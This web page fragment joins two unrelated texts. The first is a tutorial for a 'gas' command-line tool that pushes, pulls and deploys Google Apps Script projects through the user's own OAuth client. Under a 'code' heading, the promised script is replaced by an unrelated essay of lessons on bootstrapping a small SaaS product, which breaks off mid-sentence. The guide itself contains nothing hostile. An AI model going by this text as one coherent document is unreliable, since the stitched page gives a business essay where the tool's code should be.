</code></pre><h3 id="before-you-can-run-it">before you can run it</h3>
<p>To use the google app script api, you need your own application that has a client key and secret. That means you have to create your own project, with all the right permission and all.</p>
<blockquote>
<p>❗ read and do each step carefully, all of these steps have to be completed before it will work</p>
</blockquote>
<ol>
<li>in the [app script setting][appscript-setting], turn on “Google App Script API”</li>
<li>create a new project on google <a href="https://console.developers.google.com/">console</a></li>
<li>enable the <a href="https://console.developers.google.com/apis/library/script.googleapis.com">app script api</a> for your project</li>
<li>in your new project, go on to the <a href="https://console.developers.google.com/apis/credentials/consent">oauth consent screen</a> (just fill in the form, it will be unverified, but it doesnt matter, you are the only one using it anyways)</li>
<li>in the [credentials page][consent-cred], create a new oauth and note down the client key and client secret somewhere</li>
<li>now you have to add your  key and secret in the environment somewhere as <code>GAS_KEY_ID</code> and <code>GAS_KEY_SECRET</code>
<ul>
<li>on linux, you can add <code>export GAS_KEY_ID=key_id_here</code> and <code>export GAS_KEY_SECRET=key_secret_here</code> to your <code>.bashrc</code> files</li>
<li>on windows you can add them as your system environments</li>
<li>however you get it to work, as long as you have these environment variables accessible to the script</li>
</ul>
</li>
</ol>
<h3 id="setting-it-up">setting it up</h3>
<ol>
<li>ensure that you have completed all the steps in the previous section</li>
<li>at this point, you should have <code>GAS_KEY_ID</code> and <code>GAS_KEY_SECRET</code> set in your environment</li>
<li>get the <a href="https://gitlab.com/snippets/1988224/raw">raw script</a> from gitlab</li>
<li>save it somewhere and make you sure can run it (add to path, make it executable, blah blah, …)</li>
<li>run <code>gas login</code>, you will be provided a link, navigate to that link in your browser</li>
<li>will you get to some unverified application page, go to that little link on the bottom left, and go ahead with it (it’s your own application anyways, it’s fine)</li>
<li>you will be redirected to a local page and your credentials should be saved. You can check it on <code>$HOME/gasrc.json</code> (<strong>note</strong>: on windows you might have to explicitly set the “HOME” variable, just windows things)</li>
<li>now, you should be able to start - create a new project in <a href="https://script.google.com/home">google app script</a> and follow along in the next section</li>
</ol>
<h3 id="demonstration-with-explanation-push-pull">demonstration with explanation (push pull)</h3>
<ol>
<li>open up your project, and go to the web editor</li>
<li>note the script id in “File &gt; Project Properties &gt; Info”</li>
<li>create and navigate to your project root on your local system</li>
<li>run <code>gas init script-id-here</code> with the script id</li>
<li>do a <code>gas login</code> if you havent done so in the previous step</li>
<li><code>gas pull</code>. All your projects files will be downloaded. There are 3 types of files, either <code>SERVER_JS</code> (downloaded as <code>js</code>), <code>JSON</code> and <code>HTML</code></li>
<li>make your changes, create new files, delete files, whatever you wish</li>
<li><code>gas push</code> to update your project. Only files of the extension <code>js</code>, <code>json</code> and <code>html</code> will be uploaded. (<strong>note</strong>: even files in directories will be uploaded; they will just have their path preprended to the file name)</li>
<li>Go back to your google app script editor and reload the pages, it should all be there, the new updates</li>
</ol>
<h3 id="demonstration-with-explanation-webapp-deploy">demonstration with explanation (webapp deploy)</h3>
<ol>
<li>go on to your project on app script</li>
<li>follow the steps <a href="https://developers.google.com/apps-script/guides/web">here</a>, and create the basic functions need to publish as a web app (basically a <code>doGet()</code> that returns a <code>TextOutput</code>)</li>
<li>go to “publish &gt; deploy as web app”, this will give us a basic deployment to get stared with</li>
<li>navigate to your local GAS project directory, pull all the updated files using <code>gas pull</code></li>
<li>run <code>gas deploy</code>, you should see project that has some “meta-web application” description on it</li>
<li>note down the deployment id, the long string of characters on the second line</li>
<li><code>gas deploy set deployment-id-here</code> this will set your default deployment, and whenever you run the deployment update, this will be the deployment it updates</li>
<li>make your changes, maybe change return of the <code>doGet</code> to add a smiley face, or anything really</li>
<li><code>gas deploy udp</code> this pushes your new code up, creates a new version and deploys it</li>
<li>check it, go to the link that points to your deployment, and see that your code has indeed changed (the smiley face, or whatever new you have added is there)</li>
</ol>
<h3 id="final">final</h3>
<p>cool stuff to mention, so that you can spot it in the <a href="https://gitlab.com/snippets/1988224">code</a></p>
<ul>
<li>you dun even need to be at the root directory to run the code, any sub directory will do (just like git)</li>
<li>we start a quick server just to deal with all the oauth stuff</li>
<li>we handle pagination as well, as an example <code>gas deploy proc -f</code> gets all the processes</li>
</ul>
<h3 id="code">code</h3>

        <div>

            

            <p>I wouldn't say I'm an expert, but Belle and I have made a SaaS product with web, Android, and iOS apps, starting from scratch, and over the years built it to the point where it pays us both to work on it full-time. That's my idea of success. I'm not interested in being wealthy, or taking venture capital, or scaling beyond the two of us. </p>
<p>Here are some things I've learned along the way. If you think you might like to do something along the lines of what I've described, perhaps you'll find these opinions useful, although I imagine most are not very novel. Many are related so forgive me for repeating myself. </p>
<p>All of these are based on my own experience and values and may be totally the wrong advice for you.</p>
<p><strong>It's okay to start with the technologies you know.</strong> In fact, I strongly recommend it. If you're good at JavaScript, write your backend in Node. If you make iOS apps, start with an app and use something like Firebase if you need server-side bits. Don't start by learning something new, you'll just make something that's already difficult that much harder. (Learn new stuff later, though. That's fine and keeps it fun.)</p>
<p><strong>Things really will go better if you build something you'll use yourself.</strong> Dogfood it. It'll also help you maintain an interest in building it once the novelty of having users and income wears off.</p>
<p><strong>YAGNI <small>(You Ain't Gonna Need It)</small> is a good aphorism but don't take it to mean you can only build what you need today and no more.</strong> I think it's fine to build things in a generic way you can extend. I feel fortunate that Exist's core is still fundamentally the same today, seven years later, because I tried to design a generic data model and integrations architecture that could account for the things we might add. Don't over-architect it, sure, but don't be short-sighted either.</p>
<p><strong>You don't need to go through an incubator or accelerator.</strong> You don't need external funding. These things are undoubtedly useful in some circumstances but they are marketed as a necessity, and even glamorous, because they make other people money. Don't chase status symbols for their own sake. Why give up equity? Why give your investors the means to make decisions for you? Their interests are not necessarily aligned with yours. I'm not saying never do it, just consider your needs instead of taking it as a given.</p>
<p><strong>You don't need to be a "startup".</strong> Your end goal doesn't have to be "CEO of a big tech company with lots of employees". There are viable alternatives and being an indie-sized business is quite a comfortable way to do things.</p>
<p><strong>Mentors are good for support when things are hard, but remember that the person who best understands what you want to do is you.</strong> If they give you conflicting advice, try to understand their viewpoint, and if you still think you know better, ignore it.</p>
<p><strong>If you can make it fit into your life, bootstrapping works fine.</strong> You might move a lot more slowly because you're only working on your product when you're not at your day job, but this doesn't have to be a huge disadvantage.</p>
<p><strong>More generally, you <em>can</em> do it your own way.</strong> We took a lot of actions contrary to the prevailing view of the time, partly just because I like to be contrary, and it worked out. That might just be a combination of luck and privilege, but it's evidence you can point to if someone says things like "you can't get by without an incubator", or "you can't compete with a venture-backed startup as a bootstrapped company of two people who do no marketing", for example.</p>
<p><strong>Don't underestimate persistence.</strong> I don't have a lot of time for PG these days but I do think there's a lot of truth to his saying, "Startups die of suicide, not homicide." We're still here because we kept going even when we weren't making enough money and it wasn't clear that we ever would. We've outlived many competitors, even some who appeared years later. If you just keep going you may eventually get where you want to be. If we'd "failed fast" because one year in we were making hardly any money, we'd probably both still work for other people. </p>
<p><strong>Be authentic.</strong> Be yourself, a human being with flaws who has likes and dislikes and bad days. Don't act like you're a big faceless entity. It won't make people trust you more. Just be you, and be honest if you fucked up, or if you're never going to add that feature, or if you added it because you personally wanted it and you don't care if anyone else did. Paradoxically, it can be better to be open with your users about making mistakes and breaking things than to appear to never break things.</p>
<p><strong>Be open.</strong> Share whatever you can. Be transparent about what you're working on, what you want to do next, how much you're making, and how you're feeling about it. A lot of the goodwill users have towards us is because we have an open roadmap and we publish user and income stats.</p>
<p><strong>Be empathetic.</strong> Try to relate to your users as one human to another. Make the effort to understand why they are angry, or rude, or just don't care about your thing. You will fail a lot, and they won't always deserve it, but a lot of good will come of it. Acknowledge their point of view. When we first opened our pre-launch waiting list for Exist, we got some pretty rude feedback about trying to vacuum up everyone's data to sell, or that our idea was dumb, or that we shouldn't be trying to charge for something nobody would pay for. In each case I tried to understand why someone would feel that way and honestly address their concerns. In nearly every case I succeeded in turning the interaction into a positive one and many of those people signed up. I don't always have the energy to do that any more, and you get better at knowing when to just let it go, but I still believe it's something to strive for.</p>
<p><strong>Be good at support.</strong> Man, the bar for support is just so low, especially for indie software. You've probably experienced emailing the developer of an app you use about a bug and just never getting a reply, right? Replying to support tickets alone probably puts you in the top 50% straight off the bat. Replying quickly, even better, and then caring about the issue and fixing it, would seriously push you into the top 10%. Unless you get a lot of support, it's not even that hard to do, and it's such a good way to make your users think well of you. Again, you'll probably lose the motivation to be prompt and kind over time, but it's always something to strive for.</p>
<p><strong>Listen to user feedback.</strong> User suggestions are useful, and if you track what's popular you'll definitely identify trends worth pursuing. Still, temper them with your own strong ideas about what you're making. Don't just add stuff because one person made a big fuss about your product being useless without it. Get comfortable telling people you are not adding their thing just because they asked for it. As a related point, the loudest users are usually not indicative of the whole.</p>
<p><strong>Get to know your users.</strong> If you are friendly, they will be friendly to you and care about you and your thing, and maybe you will care about them and their things too and you can be friends. Be generous if you can afford to, and probably even if you can't. </p>
<p><strong>Be open to your role changing.</strong> This is a pretty obvious one but you'll have to wear a lot of hats and it might turn out that someone needs to write lots of docs, or do a lot of regular support, and you thought you were just here to code the backend. Things can change and there'll probably be plenty of tasks where there's just nobody else to handle it.</p>
<p><strong>On the other hand, you probably can get away with not doing stuff you really don't want to do.</strong> For example, we don't really do much explicit marketing now because it was Belle's role and she stopped wanting to do it and switched to iOS development. As a compromise we recorded a podcast together irregularly but because I never enjoyed doing it we stopped that too. Would we be better off with more marketing? Almost certainly. But we can get away with not doing it because we hate it and we're established enough now from having been around for years and having done the work earlier. This probably won't translate to everything, for example you can't just not write docs if you make a developer tool, but perhaps you can find a compromise that's tolerable for you.</p>
<p><strong>If you do think you need marketing but you don't like the regular methods, you can try just boosting your personal profile.</strong> Write blog posts, go to your local meetups (when those are a thing again), share screenshots of what you're working on to social media. If that still feels too much like selling yourself (and I sympathise), you could try just doing regular release notes posts for your product, or highlighting technical stuff you're doing, or even just sharing user stats. It doesn't need to be "here's why this is so great", it's just a chance for your thing to be more visible.</p>
<p><strong>Being visible gives you more chances at being visible</strong>, for example people might want to interview you about your work. I like this approach because you can just answer questions honestly and it counts as marketing. </p>
<p><strong>Don't waste time on collaborations, opportunities to work together, or deals with big companies.</strong> Because that's all you'll get out of it — wasted time. In general, anyone you don't know who wants to "hop on a call" with you will only waste your time. Even if there's, like, <em>so much</em> synergy.</p>
<p><strong>I strongly recommend you charge everyone who uses your product.</strong> Free plans only get you freeloaders.</p>
<p><strong>If you get a chargeback, just accept it — you will never win your dispute.</strong> We initially disputed every chargeback and went to the effort to prove that the user had knowingly paid for and used our product. We never won. Just accept the chargeback and then cancel that user's subscription. If someone is going to take that route rather than contacting support or asking for a refund, it's easier just to let them go as a customer. </p>
<p><strong>Offer refunds gladly.</strong> It means more to the user to get a refund than it's worth to you …</p></div></div></div>
